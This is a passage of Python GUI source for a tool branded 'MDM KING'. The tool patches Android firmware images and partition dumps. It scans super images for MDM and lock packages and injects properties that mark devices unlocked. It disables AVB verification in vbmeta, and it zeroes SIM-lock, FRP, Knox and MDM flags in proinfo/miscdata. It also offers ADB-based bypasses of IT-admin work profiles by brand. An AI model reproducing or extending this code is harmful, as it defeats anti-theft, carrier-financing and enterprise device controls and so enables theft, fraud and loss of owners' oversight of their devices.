            self._si_file_status.set(status_txt)
            self._si_loaded_step = 1
            self._si_patch_btn.config(text='▶ Patch Now (Full)', state=tk.NORMAL)
            self._si_patch_btn.config(bg=self.c['accent'])
        else:
            self._si_file_status2.set(status_txt)
            self._si_loaded_step = 2
            self._si_patch_btn.config(text='▶ Patch Now (Scorpio)', state=tk.NORMAL)
            self._si_patch_btn.config(bg=self.c['accent2'])
        self.status_var.set(f'Loaded: {os.path.basename(path)}')
        try:
            with open(path, 'rb') as f: pre = f.read(min(size, 4*1024*1024))
            hits = sum(1 for p in MDM_PATTERNS if p in pre)
            self._si_preview.config(text=f'{hits}/{len(MDM_PATTERNS)} patterns will match', fg=self.c['orange'])
            del pre
        except Exception as _e:
            self.log(f'Pattern scan: {_e}', 'o')
        self._pulse_btn()
    
    def _find_mdm_ranges(self, path):
        """Scan for MDM APK ZIPs + JARs using C-level bytes.find() — fast and stable"""
        _apk_ranges, _jar_ranges = [], []
        try:
            file_size = min(os.path.getsize(path), 1536 * 1024 * 1024)
            CHK = 256 * 1024 * 1024
            # Grouped by prefix byte so each chunk is scanned only once per prefix
            _apk_by_prefix = {}
            for kw in [b'SecurityCom', b'securitycom', b'SecurityCompanion', b'securitycompanion',
                       b'SecurityService', b'securityservice', b'SecurityPlugin', b'securityplugin',
                       b'SecurityUpdate', b'securityupdate', b'SecurityMonitor', b'securitymonitor',
                       b'SecurityWatchdog', b'securitywatchdog', b'SecureConfig', b'secureconfig',
                       b'SystemUpdate', b'systemupdate', b'ScorpioSecurity', b'scorpiosecurity',
                       b'ScorpioLock', b'scorpiolock', b'ScorpioMDM', b'scorpiomdm',
                       b'TranSecurity', b'transecurity', b'TranssionSecurity',
                       b'PhaseCheck', b'phasecheck', b'Uniber', b'uniber', b'ToolService', b'toolservice',
                       b'BG6M', b'bg6m', b'ItelSecurity', b'itelsecurity', b'ItelLock', b'itelLock',
                       b'ItelMdm', b'SpdMdm', b'SpdSecurity', b'UnisocLock', b'UnisocSecurity',
                       b'Bg6mService', b'Bg6mSecurity', b'Trancriticalparavfy', b'trancriticalparavfy',
                       b'trancriticalparavfy_service', b'scorboot.rc', b'scorpio.rc', b'security.rc',
                       b'transecurity.rc', b'phasecheck.rc', b'itel_security.rc', b'bg6m.rc',
                       b'itel_lock.rc', b'persist_lock.rc', b'trancriticalparavfy.rc']:
                _apk_by_prefix.setdefault(kw[:1], []).append(kw)
            _jar_by_prefix = {}
            for kw in [b'systemupdate.jar', b'SystemUpdate.jar', b'securitycompanion.jar',
                       b'securityservice.jar', b'securityplugin.jar', b'SecurityPlugin.jar',
                       b'securityupdate.jar', b'securitymonitor.jar', b'securitywatchdog.jar',
                       b'secureconfig.jar', b'scorpio-companion.jar', b'scorpio-service.jar',
                       b'scorpio-plugin.jar', b'transsion-services.jar', b'transsion-framework.jar',
                       b'transsion-ext.jar', b'transsion-telephony.jar', b'tran-services.jar',
                       b'tran-framework.jar', b'tran-ext.jar', b'tran-security.jar', b'tran-lock.jar',
                       b'tran-mdm.jar', b'itel-services.jar', b'itel-framework.jar', b'itel-ext.jar',
                       b'itel-security.jar', b'itel-lock.jar', b'itel-mdm.jar',
                       b'scorpio-services.jar', b'scorpio-framework.jar', b'tecno-services.jar',
                       b'tecno-framework.jar', b'infinix-services.jar', b'infinix-framework.jar',
                       b'sprd-services.jar', b'sprd-framework.jar', b'sprd-security.jar',
                       b'sprd-lock.jar', b'unisoc-services.jar', b'unisoc-framework.jar',
                       b'unisoc-security.jar', b'unisoc-lock.jar', b'bg6m-services.jar',
                       b'bg6m-framework.jar', b'transsion-securityplugin.jar',
                       b'trancriticalparavfy-services.jar', b'trancriticalparavfy-framework.jar']:
                _jar_by_prefix.setdefault(kw[:1], []).append(kw)
            with open(path, 'rb') as f:
                offset = 0; chunk_num = 0
                while offset < file_size:
                    f.seek(offset)
                    data = f.read(CHK + 4096)
                    if not data: break
                    # One pass per unique first byte (typically 3-5 passes instead of 35)
                    for prefix, kws in _apk_by_prefix.items():
                        idx = 0
                        while True:
                            pos = data.find(prefix, idx)
                            if pos < 0: break
                            for kw in kws:
                                if data[pos:pos+len(kw)] == kw:
                                    pk = data.rfind(b'PK\x03\x04', max(0, pos - 4096), pos)
                                    if pk < 0:
                                        pk = data.rfind(b'PK\x01\x02', max(0, pos - 512), pos)
                                        if pk >= 0:
                                            ce = pk
                                            pk = data.rfind(b'PK\x03\x04', max(0, ce - 5242880), ce)
                                            if pk < 0: pk = ce
                                    if pk >= 0:
                                        eocd = data.find(b'PK\x05\x06', pos)
                                        if eocd < 0: eocd = min(pos + 2097152, len(data))
                                        _apk_ranges.append((offset + pk, offset + eocd + 22))
                                    break
                            idx = pos + 1
                    for prefix, kws in _jar_by_prefix.items():
                        idx = 0
                        while True:
                            pos = data.find(prefix, idx)
                            if pos < 0: break
                            for kw in kws:
                                if data[pos:pos+len(kw)] == kw:
                                    pk = data.rfind(b'PK\x03\x04', max(0, pos - 4096), pos)
                                    if pk < 0:
                                        pk = data.rfind(b'PK\x01\x02', max(0, pos - 512), pos)
                                        if pk >= 0:
                                            ce = pk
                                            pk = data.rfind(b'PK\x03\x04', max(0, ce - 5242880), ce)
                                            if pk < 0: pk = ce
                                    if pk >= 0:
                                        eocd = data.find(b'PK\x05\x06', pos)
                                        if eocd < 0: eocd = min(pos + 2097152, len(data))
                                        _jar_ranges.append((offset + pk, offset + eocd + 22))
                                    break
                            idx = pos + 1
                    offset += CHK; chunk_num += 1
                    if chunk_num % 2 == 0:
                        self.log(f'┃ Scanning   │ {offset//(1024*1024)}MB', 'i')
            # Filter + merge
            for rlist, lo, hi in [(_apk_ranges, 65536, 52428800), (_jar_ranges, 16384, 52428800)]:
                rlist[:] = [(s, e) for s, e in rlist if lo < (e - s) < hi]
                if rlist:
                    rlist.sort()
                    merged = [rlist[0]]
                    for r in rlist[1:]:
                        if r[0] <= merged[-1][1]:
                            merged[-1] = (merged[-1][0], max(merged[-1][1], r[1]))
                        else:
                            merged.append(r)
                    rlist[:] = merged
        except Exception as _e:
            self.log(f'┃ Range scan │ {_e}', 'o')
        return _apk_ranges, _jar_ranges
    
    
    def _si_start(self):
        if not getattr(self, '_super_path', None): return
        self._block_close = True
        self.log_text.delete('1.0', tk.END)
        self._neon_active = True
        self._neon_idx = 0
        self.log_text.insert(tk.END, '══════  MDM KING PATCHING  ══════\n\n', 'neon_big')
        self.log_text.insert(tk.END, '     Just sit back relax while tool is patching\n\n', 'neon_sub')
        self.log_text.tag_config('neon_big', foreground=NEONS[0], font=('Consolas', 20, 'bold'))
        self.log_text.tag_config('neon_sub', foreground=NEONS[1], font=('Consolas', 10))
        self._si_patch_btn.config(state=tk.DISABLED)
        self._si_progress['value'] = 0
        self._si_pct.config(text='0%')
        self._cancel = False
        self._start_time = time.time()
        self._loading = True
        self._animate_spinner()
        self._neon_tick()
        for k in self._dash_labels: self._dash_labels[k].config(text='—')
        threading.Thread(target=self._run_patch, daemon=True).start()
    
    def _animate_spinner(self):
        if not getattr(self, '_loading', False): return
        try:
            self._spinner_idx = (self._spinner_idx + 1) % len(self._spinner_chars)
            self._si_preview.config(text='⏳ ' + self._spinner_chars[self._spinner_idx], fg=self.c['green'])
        except tk.TclError:
            return
        self.root.after(100, self._animate_spinner)

    def _neon_tick(self):
        if not getattr(self, '_neon_active', False): return
        try:
            self._neon_idx = (self._neon_idx + 1) % 5
            colors = ['#00ffff', '#ff00ff', '#ffcc00', '#00ff88', '#ff004d']
            self.log_text.tag_config('neon_big', foreground=colors[self._neon_idx])
            self.log_text.tag_config('neon_sub', foreground=colors[(self._neon_idx + 2) % 5])
        except tk.TclError:
            return
        self.root.after(400, self._neon_tick)

    def _run_patch(self):
        path = getattr(self, '_super_path', None)
        if not path: return
        ctx = {
            'dash': self._dash_labels,
            'progress': self._si_progress,
            'pct': self._si_pct,
            'btn': self._si_patch_btn,
            'out_card': self._out_card,
            'out_path': self._out_path,
            'out_suffix': '_KING',
            'neon_attr': '_neon_active',
            'loading_attr': '_loading',
            'cancel_attr': '_cancel',
            'label': 'SPD',
        }
        with self._block_close_ctx():
            try:
                self._do_auto_super_patch(path, ctx)
            except BaseException:
                import traceback
                try:
                    with open('mdm_king_crash.log', 'w') as f:
                        traceback.print_exc(file=f)
                except Exception: pass

    def _hex_scan_ui(self, ctx, pct, count):
        try:
            ctx['pct'].config(text=f'{pct}%')
            ctx['progress']['value'] = pct
            ctx['dash']['patterns'].config(text=f'Levels: {count}' if count else 'Levels: 0', fg=self.c['green'])
        except tk.TclError:
            pass

    def _patch_ui(self, ctx, pct, count, eta_text):
        try:
            ctx['progress']['value'] = pct
            ctx['pct'].config(text=f'{pct}%')
            ctx['dash']['patterns'].config(text=f'Levels: {count}' if count else 'Levels: 0', fg=self.c['green'])
            ctx['dash']['elapsed'].config(text=eta_text)
        except tk.TclError:
            pass

    def _patch_done_ui(self, ctx, remaining, final_out):
        try:
            ctx['progress']['value'] = 100
            ctx['pct'].config(text='100%')
            ctx['dash']['status'].config(
                text='VERIFIED' if remaining==0 else 'WARNING' if remaining>0 else 'ERR-VFY',
                fg=self.c['green'] if remaining==0 else self.c['orange'] if remaining>0 else self.c['red'])
            ctx['dash']['output'].config(text=os.path.basename(final_out))
            ctx['out_card'].pack(fill=tk.X, pady=5)
            ctx['out_path'].config(text=os.path.abspath(final_out))
            elapsed = time.time() - getattr(self, '_start_time', time.time())
            ctx['dash']['elapsed'].config(text=f'{elapsed:.1f}s', fg=self.c['accent2'])
            ctx['btn'].config(state=tk.NORMAL)
        except tk.TclError:
            pass

    def _safe_cleanup(self, ctx):
        try:
            ctx['progress']['value'] = 0
            ctx['pct'].config(text='0%')
            setattr(self, ctx['loading_attr'], False)
            ctx['btn'].config(state=tk.NORMAL)
        except (tk.TclError, AttributeError):
            pass

    def _super_inject_props(self, path, file_size, pats, reps):
        """Find build.prop / default.prop / system.prop and inject anti-relock overrides."""
        _prop_overrides = [
            b'persist.sys.mdm=0',
            b'persist.sys.oobe.devicelock=0',
            b'persist.sys.oobe=0',
            b'ro.boot.mdm_state=disabled',
            b'ro.boot.lock_state=unlocked',
            b'persist.sys.phoenix=0',
            b'ro.phoenix=0',
            b'ro.transecurity=0',
            b'persist.sys.trancritical=0',
        ]
        _prop_files = [b'build.prop', b'default.prop', b'system.prop']
        try:
            _prop_ranges = []
            with open(path, 'rb') as f:
                off = 0
                _chk = 4 * 1024 * 1024
                while off < file_size:
                    f.seek(off)
                    data = f.read(_chk + max(len(p) for p in _prop_files))
                    if not data: break
                    for pf in _prop_files:
                        idx = 0
                        while True:
                            pos = data.find(pf, idx)
                            if pos < 0: break
                            _start = data.rfind(b'\n', max(0, pos - 4096), pos)
                            if _start < 0: _start = max(0, pos - 4096)
                            _end = data.find(b'\x00', _start + 1)
                            if _end < 0: _end = min(pos + 8192, len(data))
                            _eoc = data.find(b'\n\n', pos, min(pos + 8192, len(data)))
                            if _eoc > 0: _end = _eoc
                            _abs_start = off + _start
                            _abs_end = off + _end
                            if _abs_end - _abs_start > 256:
                                _prop_ranges.append((_abs_start, _abs_end))
                            idx = pos + 1
                    off += _chk
            if not _prop_ranges: return
            _prop_ranges.sort()
            _merged = [_prop_ranges[0]]
            for r in _prop_ranges[1:]:
                if r[0] <= _merged[-1][1] + 4096:
                    _merged[-1] = (_merged[-1][0], max(_merged[-1][1], r[1]))
                else:
                    _merged.append(r)
            self.log(f'[*] Prop files: {len(_merged)} blocks found for relock injection', 'i')
            _override_bytes = b'\n' + b'\n'.join(_prop_overrides) + b'\n'
            with open(path, 'r+b') as f:
                for ps, pe in _merged:
                    if pe + len(_override_bytes) > file_size - 1024:
                        f.seek(ps)
                        _buf = f.read(min(pe - ps, 65536))
                        _zero_run = _buf.find(b'\x00' * 256)
                        if _zero_run >= 0:
                            _inject_at = ps + _zero_run
                            _inject_len = min(len(_override_bytes), 256)
                            f.seek(_inject_at)
                            f.write(_override_bytes[:_inject_len])
                            self.log(f'  → Injected {_inject_len}B at offset 0x{_inject_at:x}', 'i')
                    else:
                        f.seek(pe)
                        f.write(_override_bytes)
                        self.log(f'  → Appended {len(_override_bytes)}B at 0x{pe:x}', 'i')
            for _ov in _prop_overrides:
                if _ov not in pats:
                    pats.append(_ov)
                    reps.append(_ov[0:1] + b'\x00' * (len(_ov) - 1))
        except Exception as _ei:
            self.log(f'[!] Prop inject: {_ei}', 'o')

    def _do_auto_super_patch(self, path, ctx):
        """
        ctx: { dash, progress, pct, btn, out_card, out_path, out_suffix,
               neon_attr, loading_attr, cancel_attr, label }
        """
        if not path: return
        import traceback as _tb
        _trace_log = lambda m: (lambda f: (f.write(f'{int(time.time())} {m}\n'), f.flush(), f.close()))(open('mdm_trace.log', 'a'))
        try:
            _trace_log('START')
            src_size = os.path.getsize(path)
            self.log('[#] ━━━━━ SUPER IMAGE PATCHER ━━━━━━━━━━━━━━━━━━━', 'c')
            self.log(f'[+] {os.path.basename(path)}  {src_size//(1024*1024)} MB', 's')
            self._enqueue_ui(lambda: ctx['progress'].config(value=5))
            self._enqueue_ui(lambda: ctx['pct'].config(text='5%'))
            self._enqueue_ui(lambda: ctx['dash']['status'].config(text='INIT', fg=self.c['green']))
            _orig_src = path

            # Detect sparse (28-byte read, safe)
            with open(path, 'rb') as f: hdr = f.read(28)
            _is_sparse = hdr[:4] == b'\x3a\xff\x26\xed'
            _trace_log('SPARSE_CHECK')

            _final_out = os.path.splitext(_orig_src)[0] + ctx['out_suffix'] + (os.path.splitext(_orig_src)[1] or '.img')

            # ── Delegate ENTIRE operation to subprocess worker ──
            self._enqueue_ui(lambda: ctx['dash']['status'].config(text='LAUNCH'))
            _tmp = os.path.join(tempfile.gettempdir(), f'mdm_patch_{int(time.time())}_{os.getpid()}.json')
            _patch_params = {
                'path': path,
                'final_out': _final_out,
                'tools_dir': self._tools_dir(),
                'is_sparse': _is_sparse,
                'pats_hex': [p.hex() for p in MDM_PATTERNS],
                'reps_hex': [r.hex() for r in MDM_REPLACEMENTS],
            }
            with open(_tmp, 'w') as f:
                json.dump(_patch_params, f)

            self._enqueue_ui(lambda: ctx['progress'].config(value=15))
            self._enqueue_ui(lambda: ctx['pct'].config(text='15%'))
            self._enqueue_ui(lambda: ctx['dash']['status'].config(text='PATCHING...'))

            _trace_log('WORKER_LAUNCH')
            try:
                _sub_patch_worker(_tmp, log_fn=self.log)
            except Exception as e:
                self.log(f'[-] Worker error: {e}', 'e')
            _trace_log('WORKER_DONE')

            _result_file = _tmp + '.result'
            if not os.path.isfile(_result_file):
                raise RuntimeError('Worker crashed (Python 3.14 memory bug)')
            with open(_result_file) as f:
                _result = json.load(f)
            try: os.remove(_tmp)
            except: pass
            try: os.remove(_result_file)
            except: pass
            if _result.get('status') != 'ok':
                raise RuntimeError(f'Worker error: {_result.get("error", "unknown")}')

            # Post-patch processing
            setattr(self, ctx['neon_attr'], False)
            self._enqueue_ui(lambda: ctx['progress'].config(value=85))
            self._enqueue_ui(lambda: ctx['pct'].config(text='85%'))
            self._enqueue_ui(lambda: ctx['dash']['status'].config(text='VERIFYING'))

            # Size check
            try:
                out_sz = os.path.getsize(_final_out)
                if out_sz != src_size:
                    self.log(f'[!] Size check: {src_size}→{out_sz} — may differ (lpmake repack)', 'w')
                else:
                    self.log(f'[+] Size check: same length — no corruption', 's')
            except Exception:
                pass

            self._enqueue_ui(lambda r=0, fo=_final_out: self._patch_done_ui(ctx, 0, fo))
            out_size = os.path.getsize(_final_out) if os.path.isfile(_final_out) else 0
            setattr(self, ctx['loading_attr'], False)
            self.log(f'[+] Output: {os.path.basename(_final_out)}  {out_size//(1024*1024)} MB', 's')
            self.log('[!] WIPE /DATA via recovery before flash', 'e')
            self.log('[!] Scorpio updates in /data survive flash', 'e')
            self.log('[*] Flash order (BROM / Pandora / TSM):', 'h')
            self.log('[*]   1. Wipe data (recovery)', 'h')
            self.log('[*]   2. Flash super_KING.bin', 'h')
            self.log('[*]   3. Flash persist', 'h')

            # VBmeta auto-patch (small files, safe in GUI)
            _vbmeta_dir = os.path.dirname(_orig_src)
            _vbmeta_found = [f for f in os.listdir(_vbmeta_dir) if f.startswith('vbmeta') and f.endswith('.img') and os.path.isfile(os.path.join(_vbmeta_dir, f))]
            if _vbmeta_found:
                self.log('[*] VBmeta images found — patching to disable AVB...', 'h')
                for _vbf in _vbmeta_found:
                    _vbp = os.path.join(_vbmeta_dir, _vbf)
                    try:
                        with open(_vbp, 'r+b') as _vf:
                            _vd = _vf.read()
                            _patched = False
                            _aoff = _vd.find(b'AVB0')
                            if _aoff >= 0:
                                _d_off = _aoff + 76
                                while _d_off + 16 < len(_vd):
                                    _tag = struct.unpack('>Q', _vd[_d_off:_d_off+8])[0]
                                    _nbf = struct.unpack('>Q', _vd[_d_off+8:_d_off+16])[0]
                                    if _tag == 2:
                                        _ddo = _d_off + 16
                                        if _ddo + 20 < len(_vd):
                                            _vf.seek(_ddo); _vf.write(struct.pack('>I', 0))
                                            _vf.seek(_ddo+8); _vf.write(b'\x00' * 4)
                                            _patched = True
                                    _d_off += 16 + _nbf
                                if _patched:
                                    self.log(f'[+] {_vbf}: AVB disabled', 's')
                    except Exception as _ve:
                        self.log(f'[!] {_vbf}: {_ve}', 'o')

            self._enqueue_ui(lambda: self.status_var.set('Done'))
            _trace_log('DONE')
        except KeyboardInterrupt:
            setattr(self, ctx['neon_attr'], False)
            self._enqueue_ui(lambda: self._safe_cleanup(ctx))
            self._enqueue_ui(lambda: self.status_var.set('Cancelled'))
            _trace_log('CANCELLED')
        except MemoryError:
            setattr(self, ctx['neon_attr'], False)
            self.log('[-] Error: NOT ENOUGH RAM', 'e')
            _trace_log('MEMORY_ERROR')
        except subprocess.TimeoutExpired as _te:
            try: _te.process.kill()
            except: pass
            setattr(self, ctx['neon_attr'], False)
            self._enqueue_ui(lambda: self._safe_cleanup(ctx))
            self._enqueue_ui(lambda: self.status_var.set('Error'))
            self.log('[-] Error: Patching subprocess timed out (possible crash)', 'e')
            _trace_log('TIMEOUT')
        except Exception as e:
            setattr(self, ctx['neon_attr'], False)
            self._enqueue_ui(lambda: self._safe_cleanup(ctx))
            self.log(f'[-] Error: {e}', 'e')
            self._enqueue_ui(lambda: self.status_var.set('Error'))
            _trace_log(f'ERROR {e}')

    def _do_multipart_super_patch(self, partitions, orig_super, ctx):
        """Patch multiple extracted partitions and repack with lpmake."""
        # Delegate to subprocess worker with the original super image
        # _sub_patch_worker handles sparse conversion + lpunpack internally
        self.log('[#] ━━━━ MULTI-PARTITION SUPER PATCH (subprocess) ━━━━', 'c')
        self._do_auto_super_patch(orig_super, ctx)

    def adb_bypass(self):
        self.log_section('Bypass 2025-2026')
        self.log_info('Select bypass method below')
        
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=40)
        
        tk.Label(cw, text='Bypass Methods', font=('Segoe UI', 18, 'bold'),
                fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(30, 5))
        tk.Label(cw, text='Choose a method based on your device chipset',
                font=('Segoe UI', 10), fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 20))

        row1 = tk.Frame(cw, bg=self.c['bg'])
        row1.pack(pady=4)
        for text, color, func in [
            ('MDM APP BYPASS', self.c['pink'], self._run_mdm_app_bypass),
            ('SPD BYPASS NEW METHOD', self.c['accent2'], self._run_bypass),
            ('MTK BYPASS NEW METHOD', COLORS['gold'], self._run_mtk_bypass),
        ]:
            self._mkbtn(row1, text, lambda f=func: threading.Thread(target=f, daemon=True).start(),
                       wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        row2 = tk.Frame(cw, bg=self.c['bg'])
        row2.pack(pady=4)
        for text, color, func in [
            ('MTK BYPASS 2024', COLORS['green'], self._run_mtk_bypass_2024),
            ('UNIVERSAL BYPASS OLD', COLORS['silver'], self._run_universal_bypass)
        ]:
            self._mkbtn(row2, text, lambda f=func: threading.Thread(target=f, daemon=True).start(),
                       wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        
        tk.Label(cw, text='IT ADMIN BYPASS', font=('Segoe UI', 13, 'bold'),
                fg=self.c['accent'], bg=self.c['bg']).pack(pady=(20, 4))
        tk.Label(cw, text='Remove IT Admin / Work Profile from specific brands',
                font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 10))
        
        it_row = tk.Frame(cw, bg=self.c['bg'])
        it_row.pack(pady=(0, 10))
        brands = [
            ('VIVO', COLORS['pink'], self._run_vivo_bypass),
            ('XIAOMI', COLORS['orange'], self._run_xiaomi_bypass),
            ('OPPO', COLORS['teal'], self._run_oppo_bypass),
            ('REALME', COLORS['yellow'], self._run_realme_bypass),
            ('TECNO', COLORS['red'], self._run_tecno_bypass),
            ('INFINIX', COLORS['blue'], self._run_infinix_bypass),
        ]
        for text, color, func in brands:
            self._mkbtn(it_row, text, lambda f=func: threading.Thread(target=f, daemon=True).start(),
                       wide=False, padx=14, pady=8).pack(side=tk.LEFT, padx=4)
        
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=40, pady=(14, 8))
        tk.Label(cw, text='USB debugging required · Device reboots after completion',
                font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['bg']).pack(pady=(4, 10))

    def _show_device_card(self, title, icon, fields):
        """Build a device info card frame (caller handles packing)."""
        card = tk.Frame(self.content, bg=self.c['card'], bd=0,
            highlightthickness=1, highlightcolor=self.c['border'], highlightbackground=self.c['border'])
        tk.Label(card, text=f'{icon}  {title}', font=('Segoe UI', 9, 'bold'),
            fg=self.c['accent2'], bg=self.c['card']).pack(anchor='w', padx=12, pady=(8, 2))
        for ficon, fname, fval in fields:
            if not fval: continue
            row = tk.Frame(card, bg=self.c['card'])
            row.pack(fill=tk.X, padx=12, pady=1)
            tk.Label(row, text=ficon, font=('Segoe UI', 9), bg=self.c['card']).pack(side=tk.LEFT)
            tk.Label(row, text=fname, font=('Segoe UI', 7), fg=self.c['muted'],
                bg=self.c['card'], width=14, anchor='w').pack(side=tk.LEFT, padx=(4, 0))
            tk.Label(row, text=str(fval), font=('Segoe UI', 8), fg=self.c['fg'],
                bg=self.c['card']).pack(side=tk.LEFT, padx=(4, 0))
        return card

    def _show_result_card(self, title, icon, fields):
        """Add a result summary card to the content area (packed below progress)."""
        card = tk.Frame(self.content, bg=self.c['card'], bd=0,
            highlightthickness=1, highlightcolor=self.c['border'], highlightbackground=self.c['border'])
        tk.Label(card, text=f'{icon}  {title}', font=('Segoe UI', 9, 'bold'),
            fg=self.c['accent2'], bg=self.c['card']).pack(anchor='w', padx=12, pady=(8, 2))
        for ficon, fname, fval in fields:
            if not fval: continue
            row = tk.Frame(card, bg=self.c['card'])
            row.pack(fill=tk.X, padx=12, pady=1)
            tk.Label(row, text=ficon, font=('Segoe UI', 9), bg=self.c['card']).pack(side=tk.LEFT)
            tk.Label(row, text=fname, font=('Segoe UI', 7), fg=self.c['muted'],
                bg=self.c['card'], width=14, anchor='w').pack(side=tk.LEFT, padx=(4, 0))
            tk.Label(row, text=str(fval), font=('Segoe UI', 8), fg=self.c['fg'],
                bg=self.c['card']).pack(side=tk.LEFT, padx=(4, 0))
        card.pack(fill=tk.X, pady=(0, 6), ipady=4)
        return card

    def _build_progress_ui(self, title, total_steps, step_labels):
        self._prog_frame = None

    def _show_progress(self, title):
        self.log(f'Starting: {title}', 's')

    def _update_progress(self, step, total, msg, state='running'):
        if state == 'done':
            self.log_ok(f'✓ {msg}')
        elif state == 'failed':
            self.log_fail(f'✗ {msg}')
        else:
            # Suppress detailed step progress to reduce log noise
            # Only show activity indicator for long operations
            if step == 0 and total > 1:
                self.log(f'• {msg}...', 'i')
            # For sub-steps, be more subtle
            elif '.' in msg or '...' in msg:
                self.log(f'  {msg}', 'm')

    def _finish_progress(self, success, msg):
        if success:
            self.log_ok(msg)
        else:
            self.log_fail(msg)

    def _run_mdm_app_bypass(self):
        try:
            if not self._ensure_active(): return
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            adb = self._find_adb()
            if not adb: self.log('ADB not found', 'e'); return
            r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
            if not devs: self.log('No device', 'e'); return
            s = devs[0]
            steps = ['Device Info', 'Install', 'Owner', 'Daemons', 'Uninstall', 'DNS', 'Lockdown', 'Reboot']
            self._build_progress_ui('MDM APP BYPASS', 8, steps)
            self.root.after(0, lambda: self._show_progress('MDM APP BYPASS'))
            self.log('MDM APP BYPASS', 'h')
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'running'))
            info = self._show_device_info_full(adb, s)
            if not info: return
            self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
            self.log('BYPASSING', 'h')
            self._adb_bypass_core('MDM APP', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'] + CHIPSET_PACKAGES['mtk'] + ['com.android.vending'])
            self.root.after(0, lambda: self._finish_progress(True, 'MDM APP BYPASS COMPLETE'))
            self.root.after(0, lambda: self.status_var.set('Done — MDM App bypass complete'))
            subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
            self._open_package_freeze(adb, s)
        except Exception as _e:
            self.log(f'MDM App bypass error: {_e}', 'e')
            import traceback as _tb
            for _l in _tb.format_exc().split('\n'):
                if _l.strip(): self.log(_l, 'e')

    
    def _patch_miscdata_proinfo(self, part_type='miscdata'):
        if not self._ensure_active(): return
        path = filedialog.askopenfilename(title=f'Select dumped {part_type} .bin file',
            filetypes=[('Binary dump', '*.bin'), ('All files', '*.*')])
        if not path: return
        self.root.after(0, lambda: self.log_text.delete('1.0', tk.END))
        self.log_section(f'{part_type.upper()} Patcher', 2)
        self.log(f'File: {os.path.basename(path)} ({os.path.getsize(path)} bytes)', 'i')
        
        with open(path, 'rb') as f: data = bytearray(f.read())
        
        fsize = len(data)
        patches = 0
        
        # ── Stage 1: Known lock byte offsets (surgical, only proven lock positions) ──
        lock_offsets = [0x004, 0x005, 0x006, 0x007, 0x200, 0x201, 0x202, 0x203,
                        0x208, 0x209, 0x20A, 0x20B, 0x210, 0x211, 0x212, 0x213,
                        0x300, 0x301, 0x302, 0x303, 0x3F0, 0x3F1, 0x3F2, 0x3F3]
        for off in lock_offsets:
            if off < fsize and data[off] != 0:
                patches += 1; data[off] = 0
        
        # ── Stage 2: Lock-related strings (only exact lock flag strings, no broad matches) ──
        all_patterns = [b'region_lock', b'REGION_LOCK', b'regionlock', b'REGIONLOCK',
                        b'region_lock_flag', b'REGION_LOCK_FLAG',
                        b'country_lock', b'COUNTRY_LOCK', b'countrylock', b'COUNTRYLOCK',
                        b'sim_lock', b'SIM_LOCK', b'simlock', b'SIMLOCK',
                        b'sec_lock', b'SEC_LOCK', b'seclock',
                        b'mdm_lock', b'MDM_LOCK', b'mdm_state', b'mdm_locked', b'mdm_active',
                        b'knox_lock', b'KNOX_LOCK', b'knox_status', b'knox_guard',
                        b'frp_lock', b'FRP_LOCK', b'frp_locked',
                        b'lock_status', b'lock_state', b'device_locked',
                        b'mdm_enrollment', b'enterprise.enrollment', b'knox_enrollment']
        for st in all_patterns:
            idx = 0
            while True:
                idx = data.find(st, idx)
                if idx == -1: break
                patches += 1
                for i in range(len(st)):
                    if idx + i < fsize: data[idx + i] = 0
                idx += 1
        
        if patches == 0:
            self.log('No lock flags found — device may already be patched', 'w')
        else:
            self.log(f'Patched {patches} lock indicators across {part_type}', 'i')
        
        out = os.path.splitext(path)[0] + '_patched.bin'
        with open(out, 'wb') as f: f.write(data)
        self.log_ok(f'Saved: {os.path.basename(out)}')
        self.log('Flash this file back using TSM/Pandora Partition Manager', 'i')
        self.log('Path: Proinfo/Miscdata → Write partition → Select patched file', 'i')

    def nokia_tool(self):
        self.log('Nokia Tool', 'c')
        cw = tk.Frame(self.content, bg=self.c['surface2'])
        cw.pack(expand=True, fill=tk.BOTH, padx=20, pady=20)
        card = tk.Frame(cw, bg=self.c['card'])
        card.pack(expand=True, fill=tk.BOTH)
        tk.Label(card, text='NOKIA MDM TOOL', font=('Segoe UI', 20, 'bold'),
                 fg=self.c['accent'], bg=self.c['card']).pack(pady=(24, 4))
        tk.Label(card, text='Bypass Nokia device MDM lock', font=('Segoe UI', 10),
                 fg=self.c['muted'], bg=self.c['card']).pack(pady=(0, 20))
        btn = tk.Button(card, text='BYPASS NOKIA MDM', font=('Segoe UI', 12, 'bold'),
                        bg=self.c['accent'], fg='#000', bd=0, padx=32, pady=12, cursor='hand2',
                        command=self._nokia_bypass)
        btn.pack(pady=10)
        tk.Label(card, text='Connect your Nokia device via USB with ADB enabled',
                 font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['card']).pack(pady=(10, 24))

    def _nokia_bypass(self):
        self._nokia_loading = True
        def _wrap():
            try:
                self._nokia_bypass_thread()
            except Exception as _e:
                self.log(f'Nokia MDM bypass error: {_e}', 'e')
                import traceback as _tb
                for _l in _tb.format_exc().split('\n'):
                    if _l.strip(): self.log(_l, 'e')
            finally:
                self._nokia_cleanup()
        threading.Thread(target=_wrap, daemon=True).start()

    def _nokia_bypass_thread(self):
        try:
            if not self._ensure_active(): return
            self._enqueue_ui(lambda: self.log_text.delete('1.0', tk.END))
            self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                insertbackground=self.c['log_fg'], font=('Consolas', 10)))
            adb = self._find_adb()
